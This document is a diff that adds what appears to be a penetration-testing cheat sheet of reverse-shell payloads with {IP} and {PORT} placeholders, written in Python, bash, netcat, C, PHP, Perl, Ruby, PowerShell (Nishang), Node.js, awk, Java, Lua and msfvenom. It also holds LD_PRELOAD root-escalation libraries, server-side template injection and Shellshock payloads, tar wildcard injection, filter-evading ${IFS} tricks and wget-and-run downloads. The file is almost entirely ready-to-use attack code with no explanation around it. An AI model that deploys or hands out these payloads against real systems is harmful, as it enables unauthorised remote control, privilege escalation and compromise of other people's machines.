@@ -1,0 +1,641 @@
+INDEX
+
+#EXAMPLE
+
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{IP}",{PORT}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+#EXAMPLE
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+#EXAMPLE
+
+__import__("os").system("nc -e /bin/sh {IP} {PORT}")
+
+#EXAMPLE
+
+wget${IFS}http://{IP}/shell.py${IFS}-O${IFS}shell.py;python${IFS}shell.py
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+INDEX
+
+#EXAMPLE
+
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{IP}",{PORT}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+#EXAMPLE
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+#EXAMPLE
+
+__import__("os").system("nc -e /bin/sh {IP} {PORT}")
+
+#EXAMPLE
+
+wget${IFS}http://{IP}/shell.py${IFS}-O${IFS}shell.py;python3${IFS}shell.py
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+#INDEX
+
+#EXAMPLE
+
+bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
+
+#EXAMPLE
+
+0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196
+
+#EXAMPLE
+
+bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"
+
+#EXAMPLE
+
+bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261
+
+#EXAMPLE
+
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261%22
+
+#EXAMPLE
+
+echo {BASE64} | base64 -d | bash
+
+#INDEX
+
+#EXAMPLE
+
+Compile : gcc shell.c -o shell
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    int port = {PORT};
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("{IP}");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
+
+    return 0;       
+}
+
+#EXAMPLE
+
+Compile : gcc -shared -o libchill.so -fPIC libchill.c
+
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+int greetings(){
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}
+
+#EXAMPLE
+
+Comiple : gcc -o libchill.so.1 -shared -fPIC libchill.c
+sudo LD_LIBRARY_PATH=/tmp <SOME BINARY>
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+
+#EXAMPLE
+
+Comiple : gcc -fPIC -shared -nostartfiles -o preload.so preload.c
+sudo LD_PRELOAD=/tmp/preload.so binary
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+
+#INDEX
+
+#EXAMPLE
+
+nc -e /bin/sh {IP} {PORT}
+
+#EXAMPLE
+
+nc {IP} {PORT} -e bash
+
+#EXAMPLE
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f
+
+#EXAMPLE
+
+nc -e /u?r/b?n/b??? {IP} {PORT}
+
+#EXAMPLE
+
+nc {IP} {PORT} -e /u?r/b?n/b???
+
+#INDEX
+
+#EXAMPLE
+
+<?php
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = "{IP}";  
+$port = {PORT};       
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+if (function_exists('pcntl_fork')) {
+        // Fork and have the parent process exit
+        $pid = pcntl_fork();
+        if ($pid == -1) {
+                printit("ERROR: Can't fork");
+                exit(1);
+        }
+        if ($pid) {
+                exit(0);  // Parent exits
+        }
+        if (posix_setsid() == -1) {
+                printit("Error: Can't setsid()");
+                exit(1);
+        }
+        $daemon = 1;
+} else {
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+chdir("/");
+umask(0);
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+        printit("$errstr ($errno)");
+        exit(1);
+}
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+$process = proc_open($shell, $descriptorspec, $pipes);
+if (!is_resource($process)) {
+        printit("ERROR: Can't spawn shell");
+        exit(1);
+}
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+printit("Successfully opened reverse shell to $ip:$port");
+while (1) {
+        if (feof($sock)) {
+                printit("ERROR: Shell connection terminated");
+                break;
+        }
+        if (feof($pipes[1])) {
+                printit("ERROR: Shell process terminated");
+                break;
+        }
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+        if (in_array($sock, $read_a)) {
+                if ($debug) printit("SOCK READ");
+                $input = fread($sock, $chunk_size);
+                if ($debug) printit("SOCK: $input");
+                fwrite($pipes[0], $input);
+        }
+        if (in_array($pipes[1], $read_a)) {
+                if ($debug) printit("STDOUT READ");
+                $input = fread($pipes[1], $chunk_size);
+                if ($debug) printit("STDOUT: $input");
+                fwrite($sock, $input);
+        }
+        if (in_array($pipes[2], $read_a)) {
+                if ($debug) printit("STDERR READ");
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit("STDERR: $input");
+                fwrite($sock, $input);
+        }
+}
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+function printit ($string) {
+        if (!$daemon) {
+                print "$string\n";
+        }
+}
+?>
+
+#EXAMPLE
+
+<?php
+    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f');
+?>
+
+#EXAMPLE
+
+<?php
+    exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'");
+?>
+
+#INDEX
+
+#EXAMPLE
+
+perl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+#EXAMPLE
+
+use Socket
+
+$i="{IP}";
+$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){
+    open(STDIN,">&S");
+    open(STDOUT,">&S");
+    open(STDERR,">&S");
+    exec("/bin/sh -i");
+}
+
+#INDEX
+
+#EXAMPLE
+
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{IP}",{PORT});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+#EXAMPLE
+
+require 'socket'
+
+c=TCPSocket.new("{IP}",{PORT})
+
+while(cmd=c.gets)
+    IO.popen(cmd,"r"){
+        |io|c.print io.read
+    }
+end
+
+#EXAMPLE
+
+exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f")
+
+#INDEX
+
+#EXAMPLE
+
+module Main where
+
+import System.Process
+
+main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f"
+
+#INDEX
+
+#EXAMPLE
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+#EXAMPLE
+
+$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+#EXAMPLE
+
+function Invoke-PowerShellTcp 
+{ 
+<#
+.SYNOPSIS
+Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
+.DESCRIPTION
+This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
+Also, a standard netcat can connect to this script Bind to a specific port.
+The script is derived from Powerfun written by Ben Turner & Dave Hardy
+.PARAMETER IPAddress
+The IP address to connect to when using the -Reverse switch.
+.PARAMETER Port
+The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
+the given IP and port. 
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Bind -Port 4444
+Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
+Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
+listening on the given IP and port. 
+.LINK
+http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
+https://github.com/nettitude/powershell/blob/master/powerfun.ps1
+https://github.com/samratashok/nishang
+#>      
+    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
+        [Int]
+        $Port,
+
+        [Parameter(ParameterSetName="reverse")]
+        [Switch]
+        $Reverse,
+
+        [Parameter(ParameterSetName="bind")]
+        [Switch]
+        $Bind
+
+    )
+
+    
+    try 
+    {
+        #Connect back if the reverse switch is used.
+        if ($Reverse)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        }
+
+        #Bind to the provided port if Bind switch is used.
+        if ($Bind)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
+        } 
+
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+
+        #Send back current username and computername
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        #Show an interactive PowerShell prompt
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                #Execute the command on the target.
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+
+            #Return the results
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}
+
+#INDEX
+
+#EXAMPLE
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect({PORT}, "{IP}", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+#EXAMPLE
+
+require('child_process').exec('nc -e /bin/sh {IP} {PORT}')
+
+#INDEX
+
+#EXAMPLE
+
+awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+#INDEX
+
+#EXAMPLE
+
+ncat {IP} {PORT} -e /bin/bash
+
+#EXAMPLE
+
+ncat --udp {IP} {PORT} -e /bin/bash
+
+#INDEX
+
+#EXAMPLE
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o shell.exe
+
+msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o shell.exe
+
+#EXAMPLE
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=9001 -f exe -o shell.exe
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=9001 -f exe -o shell.exe
+
+#INDEX
+
+#EXAMPLE
+
+#Twig
+
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nc -e /bin/sh {IP} {PORT}")}}
+
+#EXAMPLE
+
+#Jinja/Flask
+
+{{ config['RUNCMD']('bash -i >& /dev/tcp/{IP}/{PORT} 0>&1',shell=True) }}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"')|attr('read')()}}
+
+#References
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+
+#INDEX
+
+#EXAMPLE
+
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f'" http://localhost/cgi-bin/something.cgi
+
+#INDEX
+
+#EXAMPLE
+
+String host="{IP}";
+int port={PORT};
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+#EXAMPLE
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+#INDEX
+
+#EXAMPLE
+
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f" > shell.sh
+chmod 777 ./"--checkpoint=1"
+chmod 777 ./"--checkpoint-action=exec=sh shell.sh"
+chmod 777 shell.sh
+
+#INDEX
+
+#EXAMPLE
+
+{PICKLE}
+
+#INDEX
+
+#EXAMPLE
+
+Usage : java shell.java
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class testprog {
+    public static void main(String args[]) {
+        String s;
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec("bash${IFS}-c${IFS}bash${IFS}-i${IFS}>&/dev/tcp/{IP}/{PORT}<&1");
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}
+
+#EXAMPLE
+
+Usage : java shell.java
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class testprog {
+    public static void main(String args[]) {
+        String s;
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{IP}/{PORT} 0>&1");
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}
+
+#EXAMPLE
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+#INDEX
+
+#EXAMPLE
+
+os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f")
+
+#EXAMPLE
+
+lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f")'
+
+
+
